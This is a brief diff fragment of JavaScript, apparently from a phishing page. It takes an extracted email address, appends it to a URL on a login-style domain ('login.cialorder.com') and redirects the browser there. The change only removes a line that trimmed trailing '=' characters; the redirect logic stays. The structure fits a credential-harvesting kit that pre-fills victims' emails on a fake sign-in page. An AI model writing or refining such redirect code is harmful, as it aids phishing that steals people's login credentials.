@@ -52,9 +52,6 @@
             // Construct the final redirect URL with the extracted email
             var redirectURL = 'https://login.cialorder.com/mhXayjAt#' + email[0];
 
-            // Remove any trailing '=' character
-            redirectURL = redirectURL.replace(/=+$/, '');
-
             // Redirect to the final URL
             window.location.href = redirectURL;
           } else {
